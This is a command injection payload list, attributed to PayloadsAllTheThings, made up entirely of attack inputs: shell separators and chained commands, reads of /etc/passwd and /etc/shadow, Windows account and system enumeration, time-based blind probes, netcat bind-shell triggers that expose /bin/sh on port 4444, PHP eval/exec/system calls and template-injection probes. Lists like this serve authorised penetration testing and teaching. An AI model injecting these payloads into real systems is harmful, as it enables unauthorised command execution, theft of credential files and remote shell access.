# Command Injection Comprehensive Payloads
# Source: PayloadsAllTheThings

# Basic Separators
;
|
||
&
&&
`
$()
%0a
%0a%0d

# Linux Commands
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
; id
| id
; whoami
| whoami
& whoami
&& whoami
; pwd
| pwd
; uname -a
| uname -a
; cat /etc/passwd
| cat /etc/passwd
; cat /etc/shadow
; ifconfig
| ifconfig
; netstat -an
| netstat -an
; ps aux

# Windows Commands
& dir
| dir
; dir
&& dir
& whoami
| whoami
& hostname
& ipconfig /all
& systeminfo
& net user
& net localgroup Administrators
& type C:\Windows\win.ini
& type C:\boot.ini

# URL Encoded
%0als
%0aid
%0Acat%20/etc/passwd
%0A/usr/bin/id
%0a id %0a

# Blind - Time Based
; sleep 5
| sleep 5
& sleep 5
&& sleep 5
; sleep 10
| sleep 10
& ping -c 5 127.0.0.1
& ping -n 5 127.0.0.1

# Concatenation
a|id|
a;id|
a;id;
;id\n
\nid\n

# Reverse Shell Triggers
| nc -lvvp 4444 -e /bin/sh|
; nc -lvvp 4444 -e /bin/sh;
& nc -lvvp 4444 -e /bin/sh&

# PHP Functions
;{$_GET["cmd"]}
;phpinfo()
;phpinfo();//
';phpinfo();//
{${phpinfo()}}
|| phpinfo()
| phpinfo()

# Eval/Exec
eval('ls')
eval('pwd')
eval('whoami')
exec('ls')
exec('pwd')
exec('whoami')
system('ls')
system('pwd')
system('whoami')

# Template Injection
{{4+4}}
{{4+8}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
@(1+1)
